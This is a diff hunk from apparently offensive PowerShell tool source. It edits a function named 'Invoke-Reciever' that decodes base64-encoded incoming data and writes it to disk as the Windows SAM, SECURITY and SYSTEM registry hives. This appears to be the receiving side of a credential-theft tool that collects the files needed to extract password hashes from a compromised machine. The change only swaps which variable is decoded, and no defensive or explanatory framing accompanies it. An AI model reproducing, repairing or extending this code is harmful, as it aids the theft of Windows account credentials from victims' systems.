@@ -54,19 +54,19 @@ function Invoke-Reciever {
     Write-Host Starting Data Processing...
     Write-Host Processing SAM
 
-    $msg1 = [text.encoding]::ASCII.GetString($premsg1)
+    $msg1 = [text.encoding]::ASCII.GetString($msg1)
     [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SAM'), [Convert]::FromBase64String($msg1))
 
     Write-Host Processed SAM
     Write-Host Processing SECURITY
 
-    $msg2 = [text.encoding]::ASCII.GetString($premsg2)
+    $msg2 = [text.encoding]::ASCII.GetString($msg2)
     [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SECURITY'), [Convert]::FromBase64String($msg2))
 
     Write-Host Processed SECURITY
     Write-Host Processing SYSTEM
 
-    $msg3 = [text.encoding]::ASCII.GetString($premsg3)
+    $msg3 = [text.encoding]::ASCII.GetString($msg3)
     [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SYSTEM'), [Convert]::FromBase64String($msg3))
 
     Write-Host Processed SYSTEM
